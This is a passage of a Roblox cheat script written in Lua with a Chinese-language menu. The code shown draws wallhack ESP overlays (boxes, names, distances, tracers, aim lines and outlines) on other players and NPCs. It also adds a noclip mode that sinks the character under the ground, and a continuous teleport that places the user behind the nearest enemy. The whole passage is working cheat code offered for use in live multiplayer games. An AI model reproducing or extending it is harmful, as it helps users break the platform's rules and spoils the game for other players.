                        part:SetAttribute("BaseSize", part.Size)
                    end
                end
                clonedTemplate.Parent = child
                activeClonedModel = clonedTemplate
                updateLocalRotation()
            end
        end
    end
end

if localPlayer.Character then
    localPlayer.Character.ChildAdded:Connect(handleCoreSwap)
end
localPlayer.CharacterAdded:Connect(function(char)
    activeClonedModel = nil
    char.ChildAdded:Connect(handleCoreSwap)
end)
Workspace.Camera.ChildAdded:Connect(handleCoreSwap)

function updateReplacementMode() end

function setMeshPreset(name)
    selectedMeshPreset = name
    useLightsaber = false
    pickupPlayer = false
    -- 重置 meshScale 为预设默认值
    if _G.MeshIdPresets[name] then
        local tag = _G.MeshIdPresets[name]:FindFirstChild("DefaultScaleTag")
        if tag then
            meshScale = tag.Value
        else
            meshScale = 1
        end
    else
        meshScale = 1
    end
    if activeClonedModel then
        activeClonedModel:Destroy()
        activeClonedModel = nil
    end
    WindUI:Notify({ Title = "预设切换", Content = "已选择: " .. name, Duration = 2 })
end

_G.setMeshPreset = setMeshPreset
_G.selectedMeshPreset = selectedMeshPreset

-- ===== ESP 绘制 =====
local espCache = {}
local espHighlightCache = {}
local npcCache = {}
local npcHighlightCache = {}
local espVisibilityCache = {}
local espLastVisRefresh = 0

local function espIsVisible(char)
    local cam = workspace.CurrentCamera
    if not cam then return false end
    local origin = cam.CFrame.Position
    local parts = {"Head", "UpperTorso", "Torso", "HumanoidRootPart"}
    local filter = {cam, localPlayer.Character, char}
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = filter
    for _, name in ipairs(parts) do
        local part = char:FindFirstChild(name)
        if part then
            local dir = (part.Position - origin)
            local result = workspace:Raycast(origin, dir.Unit * dir.Magnitude, params)
            if not result or (result.Position - part.Position).Magnitude < 5 then
                return true
            end
        end
    end
    return false
end

local function espIsTeammate(char)
    if not _G.NEX_LC_VARS.ESP_TeamCheck then return false end
    local player = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Character == char then player = p; break end
    end
    if not player then return false end
    local myTeam = localPlayer.Team
    local theirTeam = player.Team
    if myTeam == nil or theirTeam == nil then
        myTeam = localPlayer:GetAttribute("Team") or localPlayer:GetAttribute("Faction")
        theirTeam = player:GetAttribute("Team") or player:GetAttribute("Faction")
    end
    if myTeam == nil or theirTeam == nil then return false end
    return myTeam == theirTeam
end

local function espCreateObjects()
    return {
        Box = { Drawing.new("Line"), Drawing.new("Line"), Drawing.new("Line"), Drawing.new("Line") },
        Name = Drawing.new("Text"),
        Dist = Drawing.new("Text"),
        Tracer = Drawing.new("Line"),
        AimLine = Drawing.new("Line"),
    }
end

local function espSetup(obj)
    for _, l in pairs(obj.Box) do l.Thickness = 1 end
    obj.Name.Size = 14; obj.Name.Font = Drawing.Fonts.Monospace; obj.Name.Center = true; obj.Name.Outline = true
    obj.Dist.Size = 12; obj.Dist.Font = Drawing.Fonts.Monospace; obj.Dist.Center = true; obj.Dist.Outline = true
    obj.Tracer.Thickness = 1
    obj.AimLine.Thickness = 1.5
end

local function espHide(obj)
    if not obj then return end
    for _, l in pairs(obj.Box) do l.Visible = false end
    obj.Name.Visible = false; obj.Dist.Visible = false; obj.Tracer.Visible = false; obj.AimLine.Visible = false
end

local function espDestroy(obj)
    if not obj then return end
    pcall(function()
        for _, l in pairs(obj.Box) do l:Remove() end
        obj.Name:Remove(); obj.Dist:Remove(); obj.Tracer:Remove(); obj.AimLine:Remove()
    end)
end

local function updateHighlight(objCache, key, char, color)
    if not _G.NEX_LC_VARS.ESP_Outline then
        if objCache[key] then
            objCache[key]:Destroy()
            objCache[key] = nil
        end
        return
    end
    local hl = objCache[key]
    if not hl or hl.Parent ~= char then
        if hl then hl:Destroy() end
        hl = Instance.new("Highlight")
        hl.Name = "ESPOutline"
        hl.FillTransparency = 0.5
        hl.OutlineTransparency = 0
        hl.Parent = char
        objCache[key] = hl
    end
    hl.Adornee = char
    hl.FillColor = color
    hl.OutlineColor = color
end

local function clearAllESP()
    for _, obj in pairs(espCache) do espDestroy(obj) end
    espCache = {}
    for _, hl in pairs(espHighlightCache) do
        if hl and hl.Parent then hl:Destroy() end
    end
    espHighlightCache = {}
    for _, obj in pairs(npcCache) do espDestroy(obj) end
    npcCache = {}
    for _, hl in pairs(npcHighlightCache) do
        if hl and hl.Parent then hl:Destroy() end
    end
    npcHighlightCache = {}
end

function updateESP()
    if not _G.NEX_LC_VARS.ESP_Enabled then
        clearAllESP()
        return
    end

    local now = os.clock()
    if now - espLastVisRefresh > 0.15 then
        espLastVisRefresh = now
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= localPlayer and p.Character then
                espVisibilityCache[p] = espIsVisible(p.Character)
            end
        end
    end

    local cam = workspace.CurrentCamera
    if not cam then return end
    local screenCenter = cam.ViewportSize / 2

    for _, p in ipairs(Players:GetPlayers()) do
        if p == localPlayer then continue end
        local char = p.Character
        if not char then
            if espCache[p] then espHide(espCache[p]) end
            if espHighlightCache[p] then
                espHighlightCache[p]:Destroy()
                espHighlightCache[p] = nil
            end
            continue
        end
        if espIsTeammate(char) then
            if espCache[p] then espHide(espCache[p]) end
            if espHighlightCache[p] then
                espHighlightCache[p]:Destroy()
                espHighlightCache[p] = nil
            end
            continue
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then
            if espCache[p] then espHide(espCache[p]) end
            continue
        end
        if not espCache[p] then
            espCache[p] = espCreateObjects()
            espSetup(espCache[p])
        end
        local esp = espCache[p]
        local head = char:FindFirstChild("Head")
        local topPos = (head and head.Position or root.Position + Vector3.new(0, 2, 0)) + Vector3.new(0, 0.5, 0)
        local feetPos = root.Position - Vector3.new(0, 3, 0)
        local rs, ron = cam:WorldToViewportPoint(root.Position)
        local hs = cam:WorldToViewportPoint(topPos)
        local fs = cam:WorldToViewportPoint(feetPos)
        if not ron or rs.Z <= 0 then
            espHide(esp)
            continue
        end
        local visible = espVisibilityCache[p] or false
        local color = visible and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 50, 50)

        updateHighlight(espHighlightCache, p, char, color)

        local boxTop, boxBottom = hs.Y, fs.Y
        local boxHeight = math.abs(boxBottom - boxTop)
        local boxWidth = boxHeight * 0.6
        local cx = rs.X

        if _G.NEX_LC_VARS.ESP_Boxes then
            esp.Box[1].From = Vector2.new(cx - boxWidth/2, boxTop)
            esp.Box[1].To = Vector2.new(cx + boxWidth/2, boxTop)
            esp.Box[2].From = Vector2.new(cx + boxWidth/2, boxTop)
            esp.Box[2].To = Vector2.new(cx + boxWidth/2, boxBottom)
            esp.Box[3].From = Vector2.new(cx + boxWidth/2, boxBottom)
            esp.Box[3].To = Vector2.new(cx - boxWidth/2, boxBottom)
            esp.Box[4].From = Vector2.new(cx - boxWidth/2, boxBottom)
            esp.Box[4].To = Vector2.new(cx - boxWidth/2, boxTop)
            for _, l in pairs(esp.Box) do l.Color = color; l.Visible = true end
        else
            for _, l in pairs(esp.Box) do l.Visible = false end
        end

        if _G.NEX_LC_VARS.ESP_Names then
            esp.Name.Text = p.Name
            esp.Name.Position = Vector2.new(cx, hs.Y - 18)
            esp.Name.Color = color
            esp.Name.Visible = true
        else
            esp.Name.Visible = false
        end

        if _G.NEX_LC_VARS.ESP_Distance then
            local dist = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and (root.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude) or 0
            esp.Dist.Text = math.floor(dist) .. "m"
            esp.Dist.Position = Vector2.new(cx, fs.Y + 4)
            esp.Dist.Color = Color3.fromRGB(180, 180, 180)
            esp.Dist.Visible = true
        else
            esp.Dist.Visible = false
        end

        if _G.NEX_LC_VARS.ESP_Tracers and fs.Z > 0 then
            local traceColor = Color3.fromRGB(0, 255, 0)
            local origin = cam.CFrame.Position
            local dir = (feetPos - origin).Unit
            local dist = (feetPos - origin).Magnitude
            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Blacklist
            params.FilterDescendantsInstances = {cam, localPlayer.Character, char}
            local result = workspace:Raycast(origin, dir * dist, params)
            if result then traceColor = Color3.fromRGB(255, 0, 0) end
            esp.Tracer.From = screenCenter
            esp.Tracer.To = Vector2.new(fs.X, fs.Y)
            esp.Tracer.Color = traceColor
            esp.Tracer.Visible = true
        else
            esp.Tracer.Visible = false
        end

        if _G.NEX_LC_VARS.ESP_AimLine and head then
            local aimEnd = head.Position + head.CFrame.LookVector * 30
            local aimScreen, aimOn = cam:WorldToViewportPoint(aimEnd)
            local headScreen = cam:WorldToViewportPoint(head.Position)
            if aimOn and headScreen.Z > 0 then
                esp.AimLine.From = Vector2.new(headScreen.X, headScreen.Y)
                esp.AimLine.To = Vector2.new(aimScreen.X, aimScreen.Y)
                esp.AimLine.Color = Color3.fromRGB(255, 150, 0)
                esp.AimLine.Visible = true
            else
                esp.AimLine.Visible = false
            end
        else
            esp.AimLine.Visible = false
        end
    end

    for p, _ in pairs(espCache) do
        if not p or not p.Parent then
            espDestroy(espCache[p])
            espCache[p] = nil
        end
    end
    for p, hl in pairs(espHighlightCache) do
        if not p or not p.Parent then
            if hl and hl.Parent then hl:Destroy() end
            espHighlightCache[p] = nil
        end
    end

    local npcColor = Color3.fromRGB(255, 200, 50)
    local currentNpcKeys = {}
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
            if Players:GetPlayerFromCharacter(v) then continue end
            local hum = v:FindFirstChildOfClass("Humanoid")
            local head = v:FindFirstChild("Head")
            local root = v:FindFirstChild("HumanoidRootPart")
            if not hum or hum.Health <= 0 or not head or not root then
                local key = tostring(v)
                if npcCache[key] then espHide(npcCache[key]) end
                if npcHighlightCache[key] then
                    npcHighlightCache[key]:Destroy()
                    npcHighlightCache[key] = nil
                end
                continue
            end
            local key = tostring(v)
            currentNpcKeys[key] = true
            if not npcCache[key] then
                npcCache[key] = espCreateObjects()
                espSetup(npcCache[key])
            end
            local esp = npcCache[key]
            local topPos = head.Position + Vector3.new(0, 0.5, 0)
            local feetPos = root.Position - Vector3.new(0, 3, 0)
            local rs, ron = cam:WorldToViewportPoint(root.Position)
            local hs = cam:WorldToViewportPoint(topPos)
            local fs = cam:WorldToViewportPoint(feetPos)
            if not ron or rs.Z <= 0 then
                espHide(esp)
                continue
            end
            local color = npcColor
            updateHighlight(npcHighlightCache, key, v, color)

            local boxTop, boxBottom = hs.Y, fs.Y
            local boxHeight = math.abs(boxBottom - boxTop)
            local boxWidth = boxHeight * 0.6
            local cx = rs.X

            if _G.NEX_LC_VARS.ESP_Boxes then
                esp.Box[1].From = Vector2.new(cx - boxWidth/2, boxTop)
                esp.Box[1].To = Vector2.new(cx + boxWidth/2, boxTop)
                esp.Box[2].From = Vector2.new(cx + boxWidth/2, boxTop)
                esp.Box[2].To = Vector2.new(cx + boxWidth/2, boxBottom)
                esp.Box[3].From = Vector2.new(cx + boxWidth/2, boxBottom)
                esp.Box[3].To = Vector2.new(cx - boxWidth/2, boxBottom)
                esp.Box[4].From = Vector2.new(cx - boxWidth/2, boxBottom)
                esp.Box[4].To = Vector2.new(cx - boxWidth/2, boxTop)
                for _, l in pairs(esp.Box) do l.Color = color; l.Visible = true end
            else
                for _, l in pairs(esp.Box) do l.Visible = false end
            end

            if _G.NEX_LC_VARS.ESP_Names then
                esp.Name.Text = "🤖 " .. v.Name
                esp.Name.Position = Vector2.new(cx, hs.Y - 18)
                esp.Name.Color = color
                esp.Name.Visible = true
            else
                esp.Name.Visible = false
            end

            if _G.NEX_LC_VARS.ESP_Distance then
                local dist = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and (root.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude) or 0
                esp.Dist.Text = math.floor(dist) .. "m"
                esp.Dist.Position = Vector2.new(cx, fs.Y + 4)
                esp.Dist.Color = Color3.fromRGB(180, 180, 180)
                esp.Dist.Visible = true
            else
                esp.Dist.Visible = false
            end

            if _G.NEX_LC_VARS.ESP_Tracers and fs.Z > 0 then
                local traceColor = Color3.fromRGB(0, 255, 0)
                local origin = cam.CFrame.Position
                local dir = (feetPos - origin).Unit
                local dist = (feetPos - origin).Magnitude
                local params = RaycastParams.new()
                params.FilterType = Enum.RaycastFilterType.Blacklist
                params.FilterDescendantsInstances = {cam, localPlayer.Character, v}
                local result = workspace:Raycast(origin, dir * dist, params)
                if result then traceColor = Color3.fromRGB(255, 0, 0) end
                esp.Tracer.From = screenCenter
                esp.Tracer.To = Vector2.new(fs.X, fs.Y)
                esp.Tracer.Color = traceColor
                esp.Tracer.Visible = true
            else
                esp.Tracer.Visible = false
            end

            if _G.NEX_LC_VARS.ESP_AimLine and head then
                local aimEnd = head.Position + head.CFrame.LookVector * 30
                local aimScreen, aimOn = cam:WorldToViewportPoint(aimEnd)
                local headScreen = cam:WorldToViewportPoint(head.Position)
                if aimOn and headScreen.Z > 0 then
                    esp.AimLine.From = Vector2.new(headScreen.X, headScreen.Y)
                    esp.AimLine.To = Vector2.new(aimScreen.X, aimScreen.Y)
                    esp.AimLine.Color = Color3.fromRGB(255, 150, 0)
                    esp.AimLine.Visible = true
                else
                    esp.AimLine.Visible = false
                end
            else
                esp.AimLine.Visible = false
            end
        end
    end

    for k, obj in pairs(npcCache) do
        if not currentNpcKeys[k] then
            espDestroy(obj)
            npcCache[k] = nil
            if npcHighlightCache[k] then
                npcHighlightCache[k]:Destroy()
                npcHighlightCache[k] = nil
            end
        end
    end
end

function startESPRender()
    if espRenderConn then espRenderConn:Disconnect() end
    espRenderConn = RunService.RenderStepped:Connect(updateESP)
end

function stopESPRender()
    if espRenderConn then
        espRenderConn:Disconnect()
        espRenderConn = nil
    end
    clearAllESP()
end

startESPRender()

-- ============================================
-- 遁地功能
-- ============================================
local underGroundGui = nil
local underGroundFrame = nil
local underGroundBtn = nil
local underGroundStatus = nil
local isUndergroundActive = false
local undergroundLoopConn = nil
local lockedUndergroundY = 0
local UNDERGROUND_OFFSET = -5

local function getAllParts(char)
    local parts = {}
    if not char then return parts end
    for _, obj in ipairs(char:GetDescendants()) do
        if obj:IsA("BasePart") then
            table.insert(parts, obj)
        end
    end
    return parts
end

local function getGroundY(pos)
    local character = localPlayer.Character
    local rayOrigin = Vector3.new(pos.X, pos.Y + 5, pos.Z)
    local rayDir = Vector3.new(0, -100, 0)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = character and {character} or {}
    local result = Workspace:Raycast(rayOrigin, rayDir, params)
    if result then
        return result.Position.Y
    else
        return pos.Y
    end
end

local function undergroundLoop()
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    local parts = getAllParts(char)
    for _, part in ipairs(parts) do
        part.CanCollide = false
    end
    
    local currentPos = root.Position
    if math.abs(currentPos.Y - lockedUndergroundY) > 0.5 then
        root.CFrame = CFrame.new(currentPos.X, lockedUndergroundY, currentPos.Z)
    end
    
    local vel = root.AssemblyLinearVelocity
    root.AssemblyLinearVelocity = Vector3.new(vel.X, 0, vel.Z)
end

local function enableUnderground()
    if isUndergroundActive then return end
    
    local char = localPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    local currentPos = root.Position
    local groundY = getGroundY(currentPos)
    lockedUndergroundY = groundY + UNDERGROUND_OFFSET
    
    root.CFrame = CFrame.new(currentPos.X, lockedUndergroundY, currentPos.Z)
    
    if undergroundLoopConn then undergroundLoopConn:Disconnect() end
    undergroundLoopConn = RunService.RenderStepped:Connect(undergroundLoop)
    
    isUndergroundActive = true
    
    if underGroundBtn then
        underGroundBtn.Text = "遁地 (开)"
        underGroundBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    end
    if underGroundStatus then 
        underGroundStatus.Text = "遁地中" 
    end
end

local function disableUnderground()
    if not isUndergroundActive then return end
    
    isUndergroundActive = false
    
    if undergroundLoopConn then
        undergroundLoopConn:Disconnect()
        undergroundLoopConn = nil
    end
    
    local char = localPlayer.Character
    if char then
        local parts = getAllParts(char)
        for _, part in ipairs(parts) do
            part.CanCollide = true
        end
        
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            local groundY = getGroundY(root.Position)
            root.CFrame = CFrame.new(root.Position.X, groundY + 0.5, root.Position.Z)
            root.AssemblyLinearVelocity = Vector3.zero
        end
    end
    
    if underGroundBtn then
        underGroundBtn.Text = "遁地 (关)"
        underGroundBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    end
    if underGroundStatus then 
        underGroundStatus.Text = "未遁地" 
    end
end

local function toggleUnderground()
    if isUndergroundActive then
        disableUnderground()
    else
        enableUnderground()
    end
end

local function onCharacterAddedForUnderground()
    if isUndergroundActive then
        if undergroundLoopConn then 
            undergroundLoopConn:Disconnect() 
            undergroundLoopConn = nil 
        end
        task.wait(0.1)
        enableUnderground()
    else
        task.wait(0.1)
        local char = localPlayer.Character
        if char then
            local parts = getAllParts(char)
            for _, part in ipairs(parts) do
                part.CanCollide = true
            end
            local root = char:FindFirstChild("HumanoidRootPart")
            if root and root.Position.Y < 0 then
                root.CFrame = root.CFrame + Vector3.new(0, 5, 0)
            end
        end
    end
end
localPlayer.CharacterAdded:Connect(onCharacterAddedForUnderground)

local function createUndergroundUI()
    if underGroundGui then underGroundGui:Destroy() end
    
    local playerGui = localPlayer:FindFirstChild("PlayerGui")
    if not playerGui then playerGui = localPlayer:WaitForChild("PlayerGui") end
    
    underGroundGui = Instance.new("ScreenGui")
    underGroundGui.Name = "UndergroundGUI"
    underGroundGui.ResetOnSpawn = false
    underGroundGui.Parent = playerGui
    
    underGroundFrame = Instance.new("Frame")
    underGroundFrame.Size = UDim2.new(0, 140, 0, 80)
    underGroundFrame.Position = UDim2.new(0.02, 0, 0.5, -40)
    underGroundFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    underGroundFrame.BackgroundTransparency = 0.15
    underGroundFrame.BorderSizePixel = 0
    underGroundFrame.Active = true
    underGroundFrame.Draggable = true
    underGroundFrame.Parent = underGroundGui
    Instance.new("UICorner", underGroundFrame).CornerRadius = UDim.new(0, 8)
    
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 24)
    titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    titleBar.BackgroundTransparency = 0.3
    titleBar.Parent = underGroundFrame
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -30, 1, 0)
    titleLabel.Position = UDim2.new(0, 10, 0, 0)
    titleLabel.Text = "遁地"
    titleLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 12
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.BackgroundTransparency = 1
    titleLabel.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 22, 1, 0)
    closeBtn.Position = UDim2.new(1, -24, 0, 0)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(255, 150, 150)
    closeBtn.Font = Enum.Font.SourceSansBold
    closeBtn.TextSize = 12
    closeBtn.BackgroundTransparency = 1
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function()
        if underGroundGui then underGroundGui.Visible = false end
        disableUnderground()
    end)
    
    underGroundBtn = Instance.new("TextButton")
    underGroundBtn.Size = UDim2.new(0, 100, 0, 30)
    underGroundBtn.Position = UDim2.new(0.5, -50, 0, 32)
    underGroundBtn.Text = "遁地 (关)"
    underGroundBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    underGroundBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    underGroundBtn.Font = Enum.Font.SourceSansBold
    underGroundBtn.TextSize = 12
    underGroundBtn.BorderSizePixel = 0
    underGroundBtn.Parent = underGroundFrame
    Instance.new("UICorner", underGroundBtn).CornerRadius = UDim.new(0, 5)
    underGroundBtn.MouseButton1Click:Connect(toggleUnderground)
    
    underGroundStatus = Instance.new("TextLabel")
    underGroundStatus.Size = UDim2.new(1, -20, 0, 18)
    underGroundStatus.Position = UDim2.new(0, 10, 0, 60)
    underGroundStatus.Text = "未遁地"
    underGroundStatus.TextColor3 = Color3.fromRGB(180, 180, 180)
    underGroundStatus.BackgroundTransparency = 1
    underGroundStatus.Font = Enum.Font.SourceSans
    underGroundStatus.TextSize = 10
    underGroundStatus.Parent = underGroundFrame
end

function enableUndergroundFeature()
    _G.NEX_LC_VARS.undergroundEnabled = true
    createUndergroundUI()
    if underGroundGui then underGroundGui.Visible = true end
end

function disableUndergroundFeature()
    _G.NEX_LC_VARS.undergroundEnabled = false
    disableUnderground()
    if underGroundGui then
        underGroundGui:Destroy()
        underGroundGui = nil
        underGroundFrame = nil
        underGroundBtn = nil
        underGroundStatus = nil
    end
end

-- ============================================
-- 传送到敌人身后
-- ============================================
local teleportBehindGui = nil
local teleportBehindFrame = nil
local teleportBehindBtn = nil
local teleportBehindContinuousBtn = nil
local teleportBehindActive = false
local teleportBehindContinuous = false
local teleportBehindContinuousConn = nil
local teleportBehindLastTarget = nil

local function getNearestTargetForBehind()
    local char = localPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local best, bestDist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and isEnemy(p) and p.Character then
            local eRoot = p.Character:FindFirstChild("HumanoidRootPart")
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if eRoot and hum and hum.Health > 0 then
                local d = (root.Position - eRoot.Position).Magnitude
                if d < bestDist then
                    bestDist = d
                    best = {root = eRoot, char = p.Character}
                end
            end
        end
    end
    -- 已取消NPC传送，仅对真实玩家生效
    return best
end

function teleportBehindInstant()
    local target = getNearestTargetForBehind()
    if not target then
        WindUI:Notify({ Title = "传送身后", Content = "未找到目标", Duration = 1 })
        return
    end
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local targetPos = target.root.Position
    local targetLook = target.root.CFrame.LookVector
    local behindPos = targetPos - targetLook * 5
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
    root.CFrame = CFrame.new(behindPos)
    WindUI:Notify({ Title = "传送身后", Content = "已传送至目标身后", Duration = 1 })
end

local teleportBehindLastTick = 0

function teleportBehindContinuousLoop()
    if not teleportBehindContinuous then return end
    local now = os.clock()
    if now - teleportBehindLastTick < 0.05 then return end
    teleportBehindLastTick = now
    local target = getNearestTargetForBehind()
    if not target then return end
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
    local targetPos = target.root.Position
    local pos = targetPos - Vector3.new(0, 0.5, 0)
    local rot = CFrame.Angles(math.rad(90), 0, 0)
    root.CFrame = CFrame.new(pos) * rot
end

function createTeleportBehindUI()
    if teleportBehindGui then
        teleportBehindGui.Visible = true
        return
    end
    
    local playerGui = localPlayer:FindFirstChild("PlayerGui")
    if not playerGui then playerGui = localPlayer:WaitForChild("PlayerGui") end
    
    teleportBehindGui = Instance.new("ScreenGui")
    teleportBehindGui.Name = "TeleportBehindUI"
    teleportBehindGui.ResetOnSpawn = false
    teleportBehindGui.Parent = playerGui
    
    teleportBehindFrame = Instance.new("Frame")
    teleportBehindFrame.Size = UDim2.new(0, 180, 0, 110)
    teleportBehindFrame.Position = UDim2.new(0.02, 0, 0.6, 0)
    teleportBehindFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    teleportBehindFrame.BackgroundTransparency = 0.15
    teleportBehindFrame.BorderSizePixel = 0
    teleportBehindFrame.Active = true
    teleportBehindFrame.Draggable = true
    teleportBehindFrame.Parent = teleportBehindGui
    Instance.new("UICorner", teleportBehindFrame).CornerRadius = UDim.new(0, 8)
    
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 24)
    titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    titleBar.BackgroundTransparency = 0.3
    titleBar.Parent = teleportBehindFrame
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -30, 1, 0)
    titleLabel.Position = UDim2.new(0, 10, 0, 0)
    titleLabel.Text = "传送身后"
    titleLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 12
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.BackgroundTransparency = 1
    titleLabel.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 22, 1, 0)
    closeBtn.Position = UDim2.new(1, -24, 0, 0)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(255, 150, 150)
    closeBtn.Font = Enum.Font.SourceSansBold
    closeBtn.TextSize = 12
    closeBtn.BackgroundTransparency = 1
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function()
        if teleportBehindGui then teleportBehindGui.Visible = false end
        if teleportBehindContinuous then
            teleportBehindContinuous = false
            _G.NEX_LC_VARS.teleportBehindContinuous = false
            if teleportBehindContinuousConn then
                teleportBehindContinuousConn:Disconnect()
                teleportBehindContinuousConn = nil
            end
            if teleportBehindContinuousBtn then
                teleportBehindContinuousBtn.Text = "开启"
                teleportBehindContinuousBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            end
        end
        _G.NEX_LC_VARS.teleportBehindActive = false
        teleportBehindActive = false
    end)
    
    teleportBehindBtn = Instance.new("TextButton")
    teleportBehindBtn.Size = UDim2.new(0, 120, 0, 28)
    teleportBehindBtn.Position = UDim2.new(0.5, -60, 0, 32)
    teleportBehindBtn.Text = "传送身后"
    teleportBehindBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    teleportBehindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    teleportBehindBtn.Font = Enum.Font.SourceSansBold
    teleportBehindBtn.TextSize = 12
    teleportBehindBtn.BorderSizePixel = 0
    teleportBehindBtn.Parent = teleportBehindFrame
    Instance.new("UICorner", teleportBehindBtn).CornerRadius = UDim.new(0, 5)
    teleportBehindBtn.MouseButton1Click:Connect(teleportBehindInstant)
    
    teleportBehindContinuousBtn = Instance.new("TextButton")
    teleportBehindContinuousBtn.Size = UDim2.new(0, 120, 0, 28)
    teleportBehindContinuousBtn.Position = UDim2.new(0.5, -60, 0, 68)
    teleportBehindContinuousBtn.Text = "持续传送: 关闭"
    teleportBehindContinuousBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    teleportBehindContinuousBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    teleportBehindContinuousBtn.Font = Enum.Font.SourceSansBold
    teleportBehindContinuousBtn.TextSize = 11
    teleportBehindContinuousBtn.BorderSizePixel = 0
    teleportBehindContinuousBtn.Parent = teleportBehindFrame
    Instance.new("UICorner", teleportBehindContinuousBtn).CornerRadius = UDim.new(0, 5)
    teleportBehindContinuousBtn.MouseButton1Click:Connect(function()
        teleportBehindContinuous = not teleportBehindContinuous
        _G.NEX_LC_VARS.teleportBehindContinuous = teleportBehindContinuous
        if teleportBehindContinuous then
            teleportBehindContinuousBtn.Text = "持续传送: 开启"
            teleportBehindContinuousBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
            if not teleportBehindContinuousConn then
                teleportBehindContinuousConn = RunService.RenderStepped:Connect(teleportBehindContinuousLoop)
            end
        else
            teleportBehindContinuousBtn.Text = "持续传送: 关闭"
            teleportBehindContinuousBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            if teleportBehindContinuousConn then
                teleportBehindContinuousConn:Disconnect()
                teleportBehindContinuousConn = nil
            end
        end
    end)
end

function destroyTeleportBehindUI()
    if teleportBehindContinuousConn then
        teleportBehindContinuousConn:Disconnect()
        teleportBehindContinuousConn = nil
    end
    teleportBehindActive = false
    teleportBehindContinuous = false
    _G.NEX_LC_VARS.teleportBehindActive = false
    _G.NEX_LC_VARS.teleportBehindContinuous = false
    if teleportBehindGui then
        teleportBehindGui:Destroy()
        teleportBehindGui = nil
        teleportBehindFrame = nil
        teleportBehindBtn = nil
        teleportBehindContinuousBtn = nil
    end
end

updateLoadingProgress("正在构建界面...", 75)

-- ===== UI 构建 =====
AnnounceTab = Window:Tab({ Title = "loc:TAB_ANNOUNCEMENT", Icon = "megaphone" })
AnnounceSection = AnnounceTab:Section({ Title = "📢 公告 & 反馈", Icon = "bell", Opened = true })
AnnounceSection:Paragraph({ Title = "loc:ANNOUNCE_WARNING_TITLE", Content = "loc:ANNOUNCE_WARNING_CONTENT", Color = Color3.fromRGB(255, 80, 80) })
AnnounceSection:Paragraph({ Title = "loc:ANNOUNCE_FIX_TITLE", Content = "loc:ANNOUNCE_FIX_CONTENT", Color = Color3.fromRGB(255, 200, 100) })

AuthorSection = AnnounceTab:Section({ Title = "👤 制作者名单", Icon = "users", Opened = true })
AuthorSection:Button({ Title = "loc:BTN_COPY_AUTHOR", Callback = function()
    copyToClipboard(Translations[WindUI.CurrentLanguage or "zh-cn"].AUTHOR_UID)
end })
AuthorSection:Button({ Title = "loc:BTN_COPY_HELPER", Callback = function()
    copyToClipboard(Translations[WindUI.CurrentLanguage or "zh-cn"].HELPER_UID)
end })
